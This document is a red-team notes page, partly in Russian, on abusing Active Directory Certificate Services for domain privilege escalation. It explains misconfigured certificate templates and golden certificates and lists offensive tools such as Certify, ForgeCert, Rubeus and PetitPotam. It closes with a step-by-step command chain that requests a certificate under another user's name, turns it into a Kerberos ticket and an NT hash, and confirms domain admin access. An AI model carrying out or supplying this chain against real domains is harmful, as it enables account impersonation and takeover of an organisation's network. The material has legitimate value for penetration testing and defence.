# ADCS

## Vulnerabilities

### Templates

#### 1

Флаг `ENROLLEE_SUPPLIES_SUBJECT` означает возможность указать альтернативное имя субъекта в сертификате (SAN). В контексте AD CS такой сертификат может представлять несколько учетных записей одновременно (в комбинации с опцией `Проверка подлинности клиента`).

Завладев любой из учеткой, которая обладает правами на выпуск сертификата по данному шаблону, имеем возможность повысить привилегии в домене.

Так же важна возможность использования сертификата для `Client Authentication` и наличие прав на выпуск серта по этому шаблону (в `Enrollment Rights` ищем нас и/или нужных пользователей домена).

#### Другой пример:

У нас есть права Write DACL и Write Property для шаблона, доступ к которому есть и у интересующей нас УЗ. Тогда мы изменяем значение атрибута msPKI-Certificate-Name-Flag на 1 (это делается где-то в графическом интерфейсе?). Это установит флаг `ENROLLEE_SUPPLIES_SUBJECT` для шаблона.&#x20;

### Golden Certificates

This is feasible by stealing the private key of the CA certificate which could allow a red team to forge and sign a certificate in order to be used for authentication. Certificate based authentication is enabled by default in a domain during deployment of Active Directory Certification Services (AD CS).

Paper: [https://pentestlab.blog/2021/11/15/golden-certificate/](https://pentestlab.blog/2021/11/15/golden-certificate/)

## Tools

### Certify

Certify – a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

Link (здесь так же есть ссылки на ресерч по этой теме): [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

### PKINITtools

Tools for Kerberos PKINIT and relaying to AD CS

Link: [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

## Papers & Tools

They completely deserves your time:

* [Certified Pre-Owned (Post)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [Certified Pre-Owned (Whitpaper)](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)
* [AD CS relay attack - practical guide](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

Here are the related tools:

* [Certify](https://github.com/GhostPack/Certify): Ask for certificates and review weaknesses in ADCS configuration.
* [ForgeCert](https://github.com/GhostPack/ForgeCert): Build custom/golden certificate to impersonate users.
* [Kekeo](https://github.com/gentilkiwi/kekeo): In this case used to get a TGT or retrieve the NT hash using a certificate.
* [Rubeus](https://github.com/GhostPack/Rubeus/): In this case used to get a TGT or retrieve the NT hash using a certificate.
* [ntlmrelayx.py (ExAndroidDev impacket fork)](https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack): Perform NTLM relay attacks against ADCS web endpoint.
* [PetitPotam](https://github.com/topotam/PetitPotam): To trigger the NTLM relay attack.
* [PKINITTools](https://github.com/dirkjanm/PKINITtools): In this case used to retrieve the NT hash using a certificate, among others. Python tools.
* [certi.py](https://github.com/zer1t0/certi): Impacket version of Certify. Ask for certificate and review ADCS configuration.

```
Смотрим шаблоны:
$ python3 certi.py list 'DOMAIN/user' --dc-ip 192.168.0.1
Password: ...

Запрашиваем TGT
$ getTGT.py -ts -debug 'DOMAIN/user:password' -dc-ip 192.168.0.1

Запрашиваем у CA (CA.DOMAIN) сертификат с альтернативным именем
$ python3 certi.py req 'DOMAIN/user@CA.DOMAIN' 'Some Descr' --dc-ip 192.168.0.1 --template TemplateName --alt-name SOME.ALT.USER -k -n

С помощью PKINITTools запрашивает Kerberos-ticket для пользователя SOME.ALT.USER:
$ python3 gettgtpkinit.py -cert-pfx 'SOME.ALT.USER@DOMAIN.pfx' -pfx-pass somepassword -dc-ip 192.168.0.1 DOMAIN/SOME.ALT.USER adminnistrator.cache
...
... AS-REP encryption key (you might need this later):
... ab4e...34

Получаем NT hash:
$ KRB5CCNAME=administrator.cache python3 getnthash.py DOMAIN/SOME.ALT.USER -key ab4e...34
...
Recovered NT Hash
56...b2
...

И, проверим, обладает ли эта учетка админскими правами на домене:
$ cme -t 1 smb DC.DOMAIN -u SOME.ALT.USER -H 56...b2
... DOMAIN\SOME.ALT.USER 56...b2 (Pwn3d!)

Так же, можем попробовать перебрать NT хеш
```
